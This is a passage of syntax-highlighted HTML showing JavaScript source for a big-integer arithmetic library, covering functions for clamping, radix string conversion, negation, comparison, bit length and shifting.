<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">sh</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">((</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">sh</span><span class="p">))</span><span class="o">-</span><span class="mf">1</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="nx">sh</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">mi</span><span class="p">)</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="k">this</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// (protected) clamp off excess high words</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpClamp</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="o">--</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (public) return string representation in given radix</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnToString</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;-&quot;</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">negate</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">k</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">4</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">32</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">toRadix</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">km</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">k</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="p">,</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="p">(</span><span class="nx">i</span><span class="o">*</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">)</span><span class="o">%</span><span class="nx">k</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">i</span><span class="o">--</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="nx">p</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">int2char</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">k</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="p">((</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">p</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="nx">k</span><span class="o">-</span><span class="nx">p</span><span class="p">);</span>
<span class="w">        </span><span class="nx">d</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="o">--</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nx">p</span><span class="o">+=</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">k</span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="nx">p</span><span class="o">-=</span><span class="nx">k</span><span class="p">))</span><span class="o">&amp;</span><span class="nx">km</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">int2char</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">m</span><span class="o">?</span><span class="nx">r</span><span class="o">:</span><span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (public) -this</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnNegate</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (public) |this|</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnAbs</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&lt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?</span><span class="k">this</span><span class="p">.</span><span class="nx">negate</span><span class="p">()</span><span class="o">:</span><span class="k">this</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (public) return + if this &gt; a, - if this &lt; a, 0 if equal</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnCompareTo</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">-</span><span class="nx">a</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="o">-</span><span class="nx">a</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&lt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?-</span><span class="nx">r</span><span class="o">:</span><span class="nx">r</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="p">((</span><span class="nx">r</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">-</span><span class="nx">a</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// returns bit length of the integer x</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">nbits</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">t</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&gt;&gt;</span><span class="mf">16</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">16</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">t</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">t</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">4</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">t</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">t</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (public) return the number of bits in &quot;this&quot;</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnBitLength</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">*</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">)</span><span class="o">+</span><span class="nx">nbits</span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="o">^</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">));</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this &lt;&lt; n*DB</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpDLShiftTo</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">+</span><span class="nx">n</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this &gt;&gt; n*DB</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpDRShiftTo</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">-</span><span class="nx">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="nx">n</span><span class="p">,</span><span class="mf">0</span><span class="p">);</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this &lt;&lt; n</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpLShiftTo</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">bs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n</span><span class="o">%</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">cbs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">bs</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">bm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">cbs</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">n</span><span class="o">/</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">),</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="o">&lt;&lt;</span><span class="nx">bs</span><span class="p">)</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">DM</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="nx">ds</span><span class="o">+</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="nx">cbs</span><span class="p">)</span><span class="o">|</span><span class="nx">c</span><span class="p">;</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">bm</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="nx">bs</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ds</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">[</span><span class="nx">ds</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">+</span><span class="nx">ds</span><span class="o">+</span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// (protected) r = this &gt;&gt; n</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpRShiftTo</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">n</span><span class="o">/</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">ds</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">bs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">n</span><span class="o">%</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">cbs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">bs</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">bm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">bs</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">ds</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="nx">bs</span><span class="p">;</span>
